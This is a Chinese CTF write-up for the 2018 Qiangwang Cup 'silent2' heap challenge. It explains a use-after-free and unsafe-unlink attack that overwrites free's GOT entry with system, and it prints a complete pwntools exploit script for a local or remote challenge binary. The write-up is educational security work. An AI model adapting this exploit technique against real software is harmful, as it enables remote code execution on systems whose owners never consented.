# 2018年强网杯silent2：
https://xz.aliyun.com/news/5361

```
# checksec ./data/unsafe_unlink/silent2
[*] '/root/AutoExpMarkDocker/data/unsafe_unlink/silent2'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```

分析代码：
```c
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  int v3; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v4; // [rsp+8h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  sub_40091C(a1, a2, a3);
  sub_4009A4();
  while ( 1 )
  {
    __isoc99_scanf("%d", &v3);
    getchar();
    switch ( v3 )
    {
      case 2:
        sub_400AB7();
        break;
      case 3:
        sub_400B2F();
        break;
      case 1:
        sub_4009DC();
        break;
    }
  }
}
```
得到函数：
```python
def create(size, content):
    p.sendline('1')
    p.sendline(str(size))
    p.send(content)


def modify(idx, content1, content2):
    p.sendline('3')
    p.sendline(str(idx))
    p.send(content1)
    p.send(content2)


def delete(idx):
    p.sendline('2')
    p.sendline(str(idx))
```
可以看到是没有puts函数可以打印的，但是这题的思路相对清晰，就是利用UAF漏洞，先malloc5个chunk块（大于0x80），0,1,2,3,4，其中2chunk写入“、bin/sh\x00”，因为看到了system函数，可以直接调用的，然后free掉3和4，再申请一个大的块时就会得到之前free的两个块，上面的信息也会保留，于是可以构造fake_chunk了，这里先构造一个fake_chunk1用于unlink，接着构造第二个fake_chunk2，将第一个fake_chunk状态置为0，同时修改下一个chunk4的大小使其满足fake_chunk1+fake_chunk2 = 大的malloc的chunk。接着我们再free掉4号chunk,（double free）就会向后合并，从而使得chunk3的地址指针指向chunk0，接着再往chunk3写入free的got，再接着往chunk0写入system，然后free掉2号chunk，即可getshell~

fig1

直接上exp:
```python
#coding=utf8
from pwn import *
context.log_level = 'debug'
context(arch='amd64', os='linux')
#context(arch='i386', os='linux')
local = 1
elf = ELF('./silent2')
if local:
    p = process('./silent2')
    libc = elf.libc
else:
    p = remote('116.85.48.105',5005)
    libc = ELF('./libc.so.6')

def create(size, content):
    p.sendline('1')
    p.sendline(str(size))
    p.send(content)


def modify(idx, content1, content2):
    p.sendline('3')
    p.sendline(str(idx))
    p.send(content1)
    p.send(content2)


def delete(idx):
    p.sendline('2')
    p.sendline(str(idx))


p.recvuntil('king') # 自己创建的banner.txt文件的内容

func_addr = 0x4009C0
free_got_plt = 0x602018
p_addr = 0x6020D8

create(0x100, 'AAAA')
create(0x100, 'BBBB')
create(0x100, '/bin/sh\x00')
#bk(0x0000000000400A4F)
create(0x100, 'DDDD')
create(0x100, 'EEEEE')

delete(3)
delete(4)
payload = p64(0) + p64(0x101) + p64(p_addr - 0x18) + p64(p_addr - 0x10) + 'A' * (0x100 - 0x20) + p64(0x100) + p64(
    0x210 - 0x100) # 构造两个chunk，绕过unlink的检查
create(0x210, payload)
delete(4)  # double free
modify(3, p64(free_got_plt)[0:4], '1111')
modify(0, p64(func_addr)[0:6], '2222')
delete(2)

p.interactive()
```
这题和堆块下溢本质上是差不多的，区别在于没有puts函数和下溢漏洞，但是有UAF漏洞，就可以实现构造fake_chunk，这和第一题是很像的，和下溢的操作是差不多的。